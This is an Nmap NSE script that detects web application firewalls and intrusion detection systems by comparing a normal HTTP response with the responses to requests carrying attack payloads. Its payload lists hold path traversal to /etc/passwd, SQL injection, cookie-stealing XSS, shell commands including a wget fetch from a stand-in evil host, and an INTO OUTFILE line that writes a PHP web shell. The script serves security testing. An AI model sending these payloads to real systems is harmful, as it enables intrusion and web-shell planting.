description = [[
Determines if a web server is protected by an IPS (Intrusion Prevention System), IDS (Intrusion Detection System) or WAF (Web Application Firewall)

This script tries to determine if an IDS/IPS/WAF is protecting a http server. To do this the script will send a "good" request and record the
response, afterwards it will match this response against new requests containing malicious payloads. In theory, web applications shouldn't react to 
malicious requests because we are storing the payloads in a variable that is not used by the script/file and only WAF/IDS/IPS should react to it. 
If aggro mode is not on, the script will only do the minimum number of requests (Most known/noisy vectors)

This script has been tested against:
 * Apache ModSecurity 
 * Barracuda Web Application Firewall 
 * PHPIDS 
 * dotDefender
 * Imperva Web Firewall
 * Blue Coat SG 400

Since the majority of IDS/IPS/WAF's protect web applications in the same way,
 it is likely that this script detects a lot more of these IDS/IPS/WAFs solutions. It is important to note that this script will not detect
 products that do not alter the http traffic.
]]

---
-- @usage
-- nmap -p80 --script=../../http-waf-detect.nse --script-args="http-waf-detect.aggro=2,http-waf-detect.path=/testphp.vulnweb.com/artists.php" www.modsecurity.org
--
-- @output
-- PORT   STATE SERVICE
-- 80/tcp open  http
-- |_http-waf-detect: IDS/IPS/WAF detected
--
-- @args http-waf-detect.path Path to target. It is more effective if you specify a path that doesn't return a redirect
-- @args http-waf-detect.aggro true/false . If aggro mode is on, script will try all attack vectors to trigger the IDS/IPS/WAF
-- 
-- Other useful args when running this script
-- http.useragent User Agent for HTTP requests
-- http.pipeline Number of requests sent in the single request

author = "Paulino Calderon"
license = "Same as Nmap--See http://nmap.org/book/man-legal.html"
categories = {"discovery"}

require "http"
require "shortport"
require "url"

portrule = shortport.http

local attack_vectors_n1 = {"?p4yl04d=../../../../../../../../../../../../../../../../../etc/passwd", 
                            "?p4yl04d2=1 UNION ALL SELECT 1,2,3,table_name FROM information_schema.tables",
                            "?p4yl04d3=<script>alert(document.cookie)</script>"}

local attack_vectors_n2 = {"?p4yl04d=cat /etc/shadow", "?p4yl04d=id;uname -a", "?p4yl04d=<?php phpinfo(); ?>", 
                          "?p4yl04d=' OR 'A'='A", "?p4yl04d=http://google.com", "?p4yl04d=http://evilsite.com/evilfile.php", 
                          "?p4yl04d=cat /etc/passwd", "?p4yl04d=ping google.com", "?p4yl04d=hostname%00", 
                          "?p4yl04d=<img src='x' onerror=alert(document.cookie) />", "?p4yl04d=wget http://ev1l.com/xpl01t.txt", 
                          "?p4yl04d=UNION SELECT '<? system($_GET['command']); ?>',2,3 INTO OUTFILE '/var/www/w3bsh3ll.php' --"}

action = function(host, port)
  local orig_req, tests
  local path = nmap.registry.args["http-waf-detect.path"] or "/"
  local aggro = nmap.registry.args["http-waf-detect.aggro"] or false

  --get original response from a "good" request
  orig_req = http.get(host, port, path)
  orig_req.body = http.clean_404(orig_req.body)
  if orig_req.status and orig_req.body then
    stdnse.print_debug(2, "Normal HTTP response -> Status:%d Body:\n%s", orig_req.status, orig_req.body)
  else
    return "[ERROR] Initial HTTP request failed"
  end

  --if aggro mode on, try all vectors
  if aggro then
    for _, vector in pairs(attack_vectors_n2) do
      table.insert(attack_vectors_n1, vector)
    end
  end

  --perform the "3v1l" requests to try to trigger the IDS/IPS/WAF
  tests = nil
  for _, vector in pairs(attack_vectors_n1) do
    stdnse.print_debug(1, "Probing with payload:%s",vector)
    tests = http.pipeline_add(path..vector, nil, tests)
  end
  local test_results = http.pipeline_go(host, port, tests)

  if test_results == nil then
    return "[ERROR] HTTP request table is empty. This should not ever happen because we at least made one request."
  end 

  --get results
  local waf_bool = false
  for i, res in pairs(test_results) do
    res.body = http.clean_404(res.body)
    if orig_req.status ~= res.status or orig_req.body ~= res.body then
      stdnse.print_debug(1, "Payload:%s trigerred the IDS/IPS/WAF", attack_vectors_n1[i])
      if res.status and res.body then
        stdnse.print_debug(2, "Status:%s Body:%s\n", res.status, res.body)
      end
      waf_bool = true   
    end
  end
  
  if waf_bool then
    return "IDS/IPS/WAF detected"
  end
end
